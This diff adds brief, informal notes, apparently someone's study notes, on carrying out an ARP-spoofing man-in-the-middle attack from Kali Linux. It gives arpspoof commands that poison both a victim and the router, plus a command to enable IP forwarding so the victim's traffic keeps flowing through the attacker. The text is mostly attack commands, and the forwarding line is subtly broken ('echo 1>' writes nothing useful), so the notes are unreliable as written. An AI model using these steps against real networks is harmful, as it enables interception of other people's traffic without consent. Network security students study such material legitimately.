@@ -1,0 +1,17 @@
+
+
+
+arpspoofing use to create man in middle attack
+command kali machine
+#create your computer router
+arpspoof -i interface -t target_ip gateway_of_your_router
+target_ip = ip of victim
+victim think that you are the router
+#create your computer victim to the router
+arpspoof -i interface -t target_ip(in this case router) victim ip
+the router in this case think your computer as the victim
+
+
+#enable port forwarding
+echo 1> /proc/sys/net/ipv4/ip_forward
+#without enabling port forwarding victim can't access internet
